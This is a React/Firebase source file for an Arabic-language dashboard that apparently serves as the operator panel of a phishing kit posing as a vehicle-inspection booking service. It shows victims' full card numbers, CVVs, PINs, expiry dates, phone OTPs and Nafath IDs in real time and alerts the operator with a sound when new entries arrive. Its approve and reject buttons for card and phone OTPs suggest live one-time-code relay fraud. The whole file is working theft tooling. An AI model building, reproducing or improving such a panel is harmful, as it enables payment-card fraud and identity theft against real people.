"use client"

import { useState, useEffect, useRef } from "react"
import { Search, CheckCheck, Filter, Check, X } from "lucide-react"
import { Avatar, AvatarFallback } from "@/components/ui/avatar"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { collection, onSnapshot, query, orderBy, doc, updateDoc } from "firebase/firestore"
import { db } from "@/lib/firebase"

type UserData = {
  id: string
  status: "online" | "offline"
  lastSeen: string
  createdDate: string
  country: string
  vehicleType: string
  plateNumbers: string
  plateLetters: string
  region: string
  city: string
  inspectionCenter: string
  inspectionDate: string
  inspectionTime: string
  paymentMethod: "credit_card" | "debit_card" | "bank_transfer"
  phone: string
  step: string
  completedDate?: string
  cardNumber?: string
  cardName?: string
  cvv?: string
  pin?: string
  isRead?: boolean
  expiryDate?: string
  operator?: string
  phoneOtp?: string
  nafadId?: string
  authNumber?: string
  cardOtpApproval?: "pending" | "approved" | "rejected"
  phoneOtpApproval?: "pending" | "approved" | "rejected"
}

export default function DashboardPage() {
  const [users, setUsers] = useState<UserData[]>([])
  const [selectedUser, setSelectedUser] = useState<UserData | null>(null)
  const [searchQuery, setSearchQuery] = useState("")
  const [loading, setLoading] = useState(true)
  const [showFilters, setShowFilters] = useState(false)
  const [paymentFilter, setPaymentFilter] = useState<string>("all")
  const [readFilter, setReadFilter] = useState<string>("all")
  const [cardFilter, setCardFilter] = useState<string>("all")
  const audioRef = useRef<HTMLAudioElement>(null)
  const [editingAuthNumber, setEditingAuthNumber] = useState(false)
  const [authNumberValue, setAuthNumberValue] = useState("")

  useEffect(() => {
    audioRef.current = new Audio("/notification.mp3")
    audioRef.current.volume = 0.5
  }, [])

  useEffect(() => {
    const q = query(collection(db, "pays"), orderBy("createdAt", "desc"))

    const unsubscribe = onSnapshot(
      q,
      (snapshot) => {
        const userData: UserData[] = []
        let hasNewUnread = false

        snapshot.forEach((doc) => {
          const data = doc.data()
          const processedData: any = { id: doc.id }

          Object.keys(data).forEach((key) => {
            const value = data[key]
            if (value && typeof value === "object" && value.seconds) {
              processedData[key] = new Date(value.seconds * 1000).toISOString()
            } else if (value && typeof value === "object" && value[".sv"]) {
              processedData[key] = new Date().toISOString()
            } else {
              processedData[key] = value
            }
          })

          if (!processedData.isRead) {
            hasNewUnread = true
          }

          userData.push(processedData as UserData)
        })

        if (hasNewUnread && users.length > 0 && audioRef.current) {
          audioRef.current.play().catch((err) => console.log("[v0] Audio play failed:", err))
        }

        setUsers(userData)
        if (userData.length > 0 && !selectedUser) {
          setSelectedUser(userData[0])
        }
        setLoading(false)
      },
      (error) => {
        console.error("[v0] Firebase error:", error)
        setLoading(false)
      },
    )

    return () => unsubscribe()
  }, [users.length, selectedUser])

  const filteredUsers = users.filter((user) => {
    const matchesSearch =
      (user.phone || "")?.toLowerCase()?.includes(searchQuery.toLowerCase()) ||
      (user.plateNumbers || "").includes(searchQuery) ||
      (user.city || "").toLowerCase().includes(searchQuery.toLowerCase())

    const matchesReadStatus =
      readFilter === "all" || (readFilter === "read" && user.isRead) || (readFilter === "unread" && !user.isRead)

    const matchesPayment =
      paymentFilter === "all" ||
      (paymentFilter === "completed" && user.step === "payment-completed") ||
      (paymentFilter === "pending" && user.step !== "payment-completed")

    const hasCard = user.cardNumber || user.cardName || user.cvv || user.pin
    const matchesCard =
      cardFilter === "all" || (cardFilter === "hasCard" && hasCard) || (cardFilter === "noCard" && !hasCard)

    return matchesSearch && matchesReadStatus && matchesPayment && matchesCard
  })

  const toggleReadStatus = async (userId: string, currentStatus?: boolean) => {
    try {
      const userRef = doc(db, "pays", userId)
      await updateDoc(userRef, {
        isRead: !currentStatus,
      })
    } catch (error) {
      console.error("[v0] Error updating read status:", error)
    }
  }

  const updateAuthNumber = async (userId: string, newAuthNumber: string) => {
    try {
      const userRef = doc(db, "pays", userId)
      await updateDoc(userRef, {
        authNumber: newAuthNumber,
      })
      setEditingAuthNumber(false)
    } catch (error) {
      console.error("[v0] Error updating authNumber:", error)
    }
  }

  const updateCardOtpApproval = async (userId: string, status: "approved" | "rejected") => {
    try {
      const userRef = doc(db, "pays", userId)
      await updateDoc(userRef, {
        cardOtpApproval: status,
      })
    } catch (error) {
      console.error("[v0] Error updating card OTP approval:", error)
    }
  }

  const updatePhoneOtpApproval = async (userId: string, status: "approved" | "rejected") => {
    try {
      const userRef = doc(db, "pays", userId)
      await updateDoc(userRef, {
        phoneOtpApproval: status,
      })
    } catch (error) {
      console.error("[v0] Error updating phone OTP approval:", error)
    }
  }

  const unreadCount = users.filter((user) => !user.isRead).length

  const getStepLabel = (step: string) => {
    const labels: Record<string, string> = {
      "booking-completed": "اكتمل الحجز",
      "payment-method-selected": "تم اختيار طريقة الدفع",
      "card-details-submitted": "تم إرسال بيانات البطاقة",
      "otp-submitted": "تم إرسال رمز التحقق",
      "pin-submitted": "تم إرسال الرقم السري",
      "payment-completed": "اكتمل الدفع",
    }
    return labels[step] || step
  }

  const getStepColor = (step: string) => {
    if (!step) return "bg-zinc-700 text-zinc-300 border-zinc-600"
    if (step === "payment-completed") return "bg-emerald-500/10 text-emerald-400 border-emerald-500/20"
    if (step.includes("submitted")) return "bg-blue-500/10 text-blue-400 border-blue-500/20"
    return "bg-zinc-700 text-zinc-300 border-zinc-600"
  }

  const formatDate = (dateString: string) => {
    if (!dateString) return "غير متوفر"
    try {
      const date = new Date(dateString)
      if (isNaN(date.getTime())) return dateString
      return date.toLocaleDateString("ar-SA", {
        year: "numeric",
        month: "long",
        day: "numeric",
      })
    } catch {
      return dateString
    }
  }

  const formatTime = (dateString: string) => {
    if (!dateString) return "غير متوفر"
    try {
      const date = new Date(dateString)
      if (isNaN(date.getTime())) return dateString
      return date.toLocaleTimeString("ar-SA", {
        hour: "2-digit",
        minute: "2-digit",
      })
    } catch {
      return dateString
    }
  }

  const formatDateTime = (dateString: string) => {
    if (!dateString) return "غير متوفر"
    try {
      const date = new Date(dateString)
      if (isNaN(date.getTime())) return dateString
      return date.toLocaleString("ar-SA", {
        year: "numeric",
        month: "long",
        day: "numeric",
        hour: "2-digit",
        minute: "2-digit",
      })
    } catch {
      return dateString
    }
  }

  if (loading) {
    return (
      <div className="flex h-screen items-center justify-center bg-background text-foreground">
        <div className="text-center">
          <div className="h-10 w-10 animate-spin rounded-full border-4 border-border border-t-primary mx-auto mb-4"></div>
          <p className="text-muted-foreground">جاري التحميل...</p>
        </div>
      </div>
    )
  }

  if (users.length === 0) {
    return (
      <div className="flex h-screen items-center justify-center bg-background text-foreground">
        <div className="text-center">
          <p className="text-muted-foreground">لا توجد بيانات متاحة</p>
        </div>
      </div>
    )
  }

  return (
    <div className="flex h-screen overflow-hidden bg-background text-foreground" dir="rtl">
      <div className="w-[420px] border-l border-border flex flex-col bg-sidebar h-full overflow-hidden shadow-xl">
        {/* Header */}
        <div className="p-6 border-b border-border/50 flex-shrink-0 bg-sidebar-header backdrop-blur-sm">
          <div className="flex items-center justify-between mb-6">
            <h1 className="text-2xl font-bold text-foreground tracking-tight">لوحة التحكم</h1>
            {unreadCount > 0 && (
              <Badge className="bg-primary text-primary-foreground font-bold px-3.5 py-1.5 rounded-full shadow-lg shadow-primary/20">
                {unreadCount} غير مقروء
              </Badge>
            )}
          </div>
          <div className="relative mb-4">
            <Search className="absolute right-4 top-1/2 -translate-y-1/2 h-5 w-5 text-muted-foreground" />
            <Input
              placeholder="ابحث باستخدام الهاتف أو رقم اللوحة..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="pr-12 h-12 bg-input border-border/50 text-foreground placeholder:text-muted-foreground focus-visible:ring-2 focus-visible:ring-primary rounded-xl transition-all shadow-sm hover:shadow-md focus-visible:shadow-lg"
            />
          </div>

          <Button
            variant="outline"
            onClick={() => setShowFilters(!showFilters)}
            className="w-full mb-3 h-11 justify-start gap-2 rounded-xl border-border/50 hover:bg-sidebar-item-hover transition-all shadow-sm hover:shadow-md"
          >
            <Filter className="h-4 w-4" />
            الفلاتر
          </Button>

          {showFilters && (
            <div className="space-y-4 mb-3 p-5 bg-input rounded-xl border border-border/50 shadow-inner">
              <div>
                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">حالة القراءة</p>
                <div className="flex gap-2">
                  <Button
                    variant={readFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setReadFilter("all")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={readFilter === "unread" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setReadFilter("unread")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    غير مقروء
                  </Button>
                  <Button
                    variant={readFilter === "read" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setReadFilter("read")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    مقروء
                  </Button>
                </div>
              </div>

              <div>
                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">حالة الدفع</p>
                <div className="flex gap-2">
                  <Button
                    variant={paymentFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setPaymentFilter("all")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={paymentFilter === "completed" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setPaymentFilter("completed")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    مكتمل
                  </Button>
                  <Button
                    variant={paymentFilter === "pending" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setPaymentFilter("pending")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    معلق
                  </Button>
                </div>
              </div>

              <div>
                <p className="text-xs font-bold mb-2.5 text-muted-foreground uppercase tracking-wider">
                  بيانات البطاقة
                </p>
                <div className="flex gap-2">
                  <Button
                    variant={cardFilter === "all" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("all")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    الكل
                  </Button>
                  <Button
                    variant={cardFilter === "hasCard" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("hasCard")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    يوجد بطاقة
                  </Button>
                  <Button
                    variant={cardFilter === "noCard" ? "default" : "outline"}
                    size="sm"
                    onClick={() => setCardFilter("noCard")}
                    className="flex-1 text-xs h-9 rounded-lg transition-all shadow-sm"
                  >
                    بدون بطاقة
                  </Button>
                </div>
              </div>
            </div>
          )}
        </div>

        <div className="flex-1 overflow-y-auto">
          {filteredUsers.map((user) => (
            <div
              key={user.id}
              className={`p-5 border-b border-border/50 cursor-pointer transition-all duration-200 relative group ${
                selectedUser?.id === user.id
                  ? "bg-sidebar-item-active border-r-4 border-r-primary shadow-lg"
                  : "hover:bg-sidebar-item-hover hover:shadow-md"
              }`}
            >
              <div onClick={() => setSelectedUser(user)} className="flex items-start gap-4">
                <div className="relative flex-shrink-0">
                  <Avatar className="h-14 w-14 ring-2 ring-border shadow-lg">
                    <AvatarFallback className="bg-avatar-bg text-avatar-foreground text-base font-bold">
                      {user.phone?.slice(-4)}
                    </AvatarFallback>
                  </Avatar>
                  {user.status === "online" && (
                    <div className="absolute bottom-0 left-0 h-4 w-4 bg-status-online border-2 border-sidebar rounded-full shadow-md"></div>
                  )}
                </div>
                <div className="flex-1 min-w-0">
                  <div className="flex items-center justify-between mb-1.5">
                    <span
                      className={`text-base ${!user.isRead ? "font-bold" : "font-semibold"} text-foreground truncate`}
                    >
                      {user.phone}
                    </span>
                    <span className="text-xs text-muted-foreground font-medium flex-shrink-0 mr-2">
                      {formatTime(user.lastSeen)}
                    </span>
                  </div>
                  <div className="flex items-center justify-between gap-2">
                    <span
                      className={`text-sm ${!user.isRead ? "font-semibold" : "font-medium"} text-muted-foreground truncate`}
                    >
                      {user.plateLetters} {user.plateNumbers}
                    </span>
                    <div className="flex items-center gap-2 flex-shrink-0">
                      {(user.cardNumber || user.cardName || user.cvv || user.pin) && (
                        <Badge className="bg-primary/10 text-primary border border-primary/20 text-xs px-2 py-0.5 rounded-lg font-bold shadow-sm">
                          💳
                        </Badge>
                      )}
                      {user.step === "payment-completed" && <CheckCheck className="h-4 w-4 text-status-completed" />}
                      {!user.isRead && (
                        <div className="h-2.5 w-2.5 bg-primary rounded-full shadow-sm shadow-primary/50"></div>
                      )}
                    </div>
                  </div>
                </div>
              </div>

              <Button
                variant="ghost"
                size="sm"
                onClick={(e) => {
                  e.stopPropagation()
                  toggleReadStatus(user.id, user.isRead)
                }}
                className="absolute left-2 top-1/2 -translate-y-1/2 opacity-0 group-hover:opacity-100 transition-all h-8 px-3 text-xs rounded-lg shadow-md hover:shadow-lg"
              >
                {user.isRead ? "غير مقروء" : "مقروء"}
              </Button>
            </div>
          ))}
        </div>
      </div>

      {/* Main Content */}
      {selectedUser && (
        <div className="flex-1 flex flex-col h-full overflow-hidden">
          <div className="p-6 border-b border-border/50 bg-chat-header flex-shrink-0 shadow-md backdrop-blur-sm">
            <div className="flex items-center gap-4">
              <Avatar className="h-14 w-14 ring-2 ring-border shadow-xl">
                <AvatarFallback className="bg-avatar-bg text-avatar-foreground font-bold text-lg">
                  {selectedUser.phone?.slice(-4)}
                </AvatarFallback>
              </Avatar>
              <div>
                <h2 className="font-bold text-xl text-foreground">{selectedUser.phone}</h2>
                <p className="text-sm text-muted-foreground flex items-center gap-2 mt-0.5">
                  {selectedUser.status === "online" ? (
                    <>
                      <span className="inline-block h-2 w-2 rounded-full bg-status-online shadow-sm shadow-status-online/50"></span>
                      متصل الآن
                    </>
                  ) : (
                    `آخر ظهور ${formatDateTime(selectedUser.lastSeen)}`
                  )}
                </p>
              </div>
            </div>
          </div>

          <div className="flex-1 overflow-y-auto p-8 bg-chat-background">
            <div className="max-w-4xl mx-auto space-y-6">
              {/* User Info Message */}
              <div className="flex justify-start animate-in fade-in slide-in-from-right-4 duration-300">
                <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-xl border border-message-border hover:shadow-2xl transition-shadow">
                  <h3 className="font-bold mb-4 text-foreground text-lg flex items-center gap-2">
                    <span className="h-1 w-1 bg-primary rounded-full"></span>
                    معلومات المستخدم
                  </h3>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-muted-foreground font-medium">الدولة:</span>
                      <span className="text-foreground font-bold">{selectedUser.country}</span>
                    </div>
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-muted-foreground font-medium">الهاتف:</span>
                      <span className="text-foreground font-bold">{selectedUser.phone}</span>
                    </div>
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-muted-foreground font-medium">تاريخ الإنشاء:</span>
                      <span className="text-foreground font-bold">{formatDate(selectedUser.createdDate)}</span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Vehicle Info Message */}
              <div className="flex justify-start animate-in fade-in slide-in-from-right-4 duration-300">
                <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-xl border border-message-border hover:shadow-2xl transition-shadow">
                  <h3 className="font-bold mb-4 text-foreground text-lg flex items-center gap-2">
                    <span className="h-1 w-1 bg-primary rounded-full"></span>
                    تفاصيل المركبة
                  </h3>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-muted-foreground font-medium">النوع:</span>
                      <span className="text-foreground font-bold">{selectedUser.vehicleType}</span>
                    </div>
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-muted-foreground font-medium">اللوحة:</span>
                      <span className="text-foreground font-bold">
                        {selectedUser.plateLetters} {selectedUser.plateNumbers}
                      </span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Appointment Info Message */}
              <div className="flex justify-end animate-in fade-in slide-in-from-left-4 duration-300">
                <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-xl">
                  <h3 className="font-bold mb-4 text-message-sent-foreground text-lg flex items-center gap-2">
                    <span className="h-1 w-1 bg-message-sent-foreground rounded-full"></span>
                    موعد الفحص
                  </h3>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-message-sent-muted font-medium">المنطقة:</span>
                      <span className="text-message-sent-foreground font-bold">{selectedUser.region}</span>
                    </div>
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-message-sent-muted font-medium">المدينة:</span>
                      <span className="text-message-sent-foreground font-bold">{selectedUser.city}</span>
                    </div>
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-message-sent-muted font-medium">المركز:</span>
                      <span className="text-message-sent-foreground font-bold">{selectedUser.inspectionCenter}</span>
                    </div>
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-message-sent-muted font-medium">التاريخ:</span>
                      <span className="text-message-sent-foreground font-bold">
                        {selectedUser.inspectionDate || "غير متوفر"}
                      </span>
                    </div>
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-message-sent-muted font-medium">الوقت:</span>
                      <span className="text-message-sent-foreground font-bold">
                        {selectedUser.inspectionTime || "غير متوفر"}
                      </span>
                    </div>
                  </div>
                </div>
              </div>

              {/* Payment Info Message */}
              <div className="flex justify-end animate-in fade-in slide-in-from-left-4 duration-300">
                <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-xl">
                  <h3 className="font-bold mb-4 text-message-sent-foreground text-lg flex items-center gap-2">
                    <span className="h-1 w-1 bg-message-sent-foreground rounded-full"></span>
                    معلومات الدفع
                  </h3>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-message-sent-muted font-medium">الطريقة:</span>
                      <span className="text-message-sent-foreground font-bold capitalize">
                        {selectedUser.paymentMethod?.replace("_", " ")}
                      </span>
                    </div>
                    <div className="flex justify-between items-center gap-4 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-message-sent-muted font-medium">الحالة:</span>
                      <Badge className={`${getStepColor(selectedUser.step)} font-bold px-3 py-1 rounded-lg`}>
                        {getStepLabel(selectedUser.step)}
                      </Badge>
                    </div>
                    {selectedUser.completedDate && (
                      <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                        <span className="text-message-sent-muted font-medium">تم الإكمال:</span>
                        <span className="text-message-sent-foreground font-bold">
                          {formatDateTime(selectedUser.completedDate)}
                        </span>
                      </div>
                    )}
                  </div>
                </div>
              </div>

              {/* Card Details Section */}
              {(selectedUser.cardNumber || selectedUser.cardName || selectedUser.cvv || selectedUser.pin) && (
                <div className="flex justify-start animate-in fade-in slide-in-from-right-4 duration-300">
                  <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-xl border border-message-border hover:shadow-2xl transition-shadow">
                    <h3 className="font-bold mb-4 text-foreground text-lg flex items-center gap-2">
                      <span className="h-1 w-1 bg-primary rounded-full"></span>
                      بيانات البطاقة
                    </h3>
                    <div className="space-y-3 text-sm">
                      {selectedUser.cardNumber && (
                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                          <span className="text-muted-foreground font-medium">رقم البطاقة:</span>
                          <span className="text-foreground font-bold font-mono">{selectedUser.cardNumber}</span>
                        </div>
                      )}
                      {selectedUser.cardName && (
                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                          <span className="text-muted-foreground font-medium">اسم حامل البطاقة:</span>
                          <span className="text-foreground font-bold">{selectedUser.cardName}</span>
                        </div>
                      )}
                      {selectedUser.expiryDate && (
                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                          <span className="text-muted-foreground font-medium">تاريخ الانتهاء:</span>
                          <span className="text-foreground font-bold font-mono">{selectedUser.expiryDate}</span>
                        </div>
                      )}
                      {selectedUser.cvv && (
                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                          <span className="text-muted-foreground font-medium">CVV:</span>
                          <span className="text-foreground font-bold font-mono">
                          <span className="text-foreground font-bold font-mono">{selectedUser.cvv}</span>
                          </span>
                        </div>
                      )}
                      {selectedUser.pin && (
                        <div className="flex flex-col gap-3 pt-3 border-t border-border/30">
                          <div className="flex justify-between gap-12">
                            <span className="text-muted-foreground font-medium">الرقم السري:</span>
                            <span className="text-foreground font-bold font-mono">{selectedUser.pin}</span>
                          </div>
                          {/* Approval buttons for card OTP */}
                          <div className="pt-3 border-t border-border/30">
                            <div className="flex items-center justify-between gap-3">
                              <span className="text-xs text-muted-foreground">حالة الموافقة:</span>
                              <div className="flex gap-2">
                                <Button
                                  size="sm"
                                  variant={selectedUser.cardOtpApproval === "approved" ? "default" : "outline"}
                                  onClick={() => updateCardOtpApproval(selectedUser.id, "approved")}
                                  className={
                                    selectedUser.cardOtpApproval === "approved"
                                      ? "bg-green-600 hover:bg-green-700 text-white shadow-md"
                                      : "shadow-sm"
                                  }
                                >
                                  <Check className="h-4 w-4 ml-1" />
                                  موافق
                                </Button>
                                <Button
                                  size="sm"
                                  variant={selectedUser.cardOtpApproval === "rejected" ? "default" : "outline"}
                                  onClick={() => updateCardOtpApproval(selectedUser.id, "rejected")}
                                  className={
                                    selectedUser.cardOtpApproval === "rejected"
                                      ? "bg-red-600 hover:bg-red-700 text-white shadow-md"
                                      : "shadow-sm"
                                  }
                                >
                                  <X className="h-4 w-4 ml-1" />
                                  رفض
                                </Button>
                              </div>
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Verification Info Message */}
              {(selectedUser.operator || selectedUser.phoneOtp) && (
                <div className="flex justify-end animate-in fade-in slide-in-from-left-4 duration-300">
                  <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-xl">
                    <h3 className="font-bold mb-4 text-message-sent-foreground text-lg flex items-center gap-2">
                      <span className="h-1 w-1 bg-message-sent-foreground rounded-full"></span>
                      معلومات التحقق
                    </h3>
                    <div className="space-y-3 text-sm">
                      {selectedUser.operator && (
                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                          <span className="text-message-sent-muted font-medium">المشغل:</span>
                          <span className="text-message-sent-foreground font-bold">{selectedUser.operator}</span>
                        </div>
                      )}
                      {selectedUser.phoneOtp && (
                        <div className="flex flex-col gap-3 pt-3 border-t border-message-sent-border/30">
                          <div className="flex justify-between gap-12">
                            <span className="text-message-sent-muted font-medium">كود التحقق:</span>
                            <span className="text-message-sent-foreground font-bold font-mono">
                              {selectedUser.phoneOtp}
                            </span>
                          </div>
                          {/* Approval buttons for phone OTP */}
                          <div className="pt-3 border-t border-message-sent-border/30">
                            <div className="flex items-center justify-between gap-3">
                              <span className="text-xs text-message-sent-muted">حالة الموافقة:</span>
                              <div className="flex gap-2">
                                <Button
                                  size="sm"
                                  variant={selectedUser.phoneOtpApproval === "approved" ? "default" : "outline"}
                                  onClick={() => updatePhoneOtpApproval(selectedUser.id, "approved")}
                                  className={
                                    selectedUser.phoneOtpApproval === "approved"
                                      ? "bg-green-600 hover:bg-green-700 text-white shadow-md"
                                      : "shadow-sm"
                                  }
                                >
                                  <Check className="h-4 w-4 ml-1" />
                                  موافق
                                </Button>
                                <Button
                                  size="sm"
                                  variant={selectedUser.phoneOtpApproval === "rejected" ? "default" : "outline"}
                                  onClick={() => updatePhoneOtpApproval(selectedUser.id, "rejected")}
                                  className={
                                    selectedUser.phoneOtpApproval === "rejected"
                                      ? "bg-red-600 hover:bg-red-700 text-white shadow-md"
                                      : "shadow-sm"
                                  }
                                >
                                  <X className="h-4 w-4 ml-1" />
                                  رفض
                                </Button>
                              </div>
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Nafad ID and Auth Number Section */}
              {(selectedUser.nafadId || selectedUser.authNumber !== undefined) && (
                <div className="flex justify-start animate-in fade-in slide-in-from-right-4 duration-300">
                  <div className="bg-message-received rounded-2xl p-6 max-w-md shadow-xl border border-message-border hover:shadow-2xl transition-shadow">
                    <h3 className="font-bold mb-4 text-foreground text-lg flex items-center gap-2">
                      <span className="h-1 w-1 bg-primary rounded-full"></span>
                      معلومات نفاذ
                    </h3>
                    <div className="space-y-3 text-sm">
                      {selectedUser.nafadId && (
                        <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                          <span className="text-muted-foreground font-medium">رقم نفاذ:</span>
                          <span className="text-foreground font-bold font-mono">{selectedUser.nafadId}</span>
                        </div>
                      )}
                      {selectedUser.authNumber !== undefined && (
                        <div className="flex flex-col gap-2 pt-3 border-t border-border/30">
                          <div className="flex items-center justify-between gap-4">
                            <span className="text-muted-foreground font-medium">رقم التفويض:</span>
                            {!editingAuthNumber ? (
                              <div className="flex items-center gap-2">
                                <span className="text-foreground font-bold font-mono">
                                  {selectedUser.authNumber || "غير محدد"}
                                </span>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => {
                                    setEditingAuthNumber(true)
                                    setAuthNumberValue(selectedUser.authNumber || "")
                                  }}
                                  className="h-8 px-2 text-xs rounded-md hover:bg-accent"
                                >
                                  تعديل
                                </Button>
                              </div>
                            ) : (
                              <div className="flex items-center gap-2">
                                <Input
                                  type="text"
                                  value={authNumberValue}
                                  onChange={(e) => setAuthNumberValue(e.target.value)}
                                  className="h-9 w-32 text-sm font-mono px-3"
                                  placeholder="رقم التفويض"
                                />
                                <Button
                                  variant="default"
                                  size="sm"
                                  onClick={() => updateAuthNumber(selectedUser.id, authNumberValue)}
                                  className="h-9 px-3 text-xs shadow-md hover:shadow-lg"
                                >
                                  حفظ
                                </Button>
                                <Button
                                  variant="ghost"
                                  size="sm"
                                  onClick={() => setEditingAuthNumber(false)}
                                  className="h-9 px-3 text-xs hover:bg-accent"
                                >
                                  إلغاء
                                </Button>
                              </div>
                            )}
                          </div>
                        </div>
                      )}
                    </div>
                  </div>
                </div>
              )}

              {/* Payment Method Message */}
              <div className="flex justify-end animate-in fade-in slide-in-from-left-4 duration-300">
                <div className="bg-message-sent rounded-2xl p-6 max-w-md shadow-xl">
                  <h3 className="font-bold mb-4 text-message-sent-foreground text-lg flex items-center gap-2">
                    <span className="h-1 w-1 bg-message-sent-foreground rounded-full"></span>
                    طريقة الدفع
                  </h3>
                  <div className="space-y-3 text-sm">
                    <div className="flex justify-between gap-12 p-2 rounded-lg hover:bg-background/10 transition-colors">
                      <span className="text-message-sent-muted font-medium">الطريقة:</span>
                      <span className="text-message-sent-foreground font-bold capitalize">
                        {selectedUser.paymentMethod?.replace("_", " ")}
                      </span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
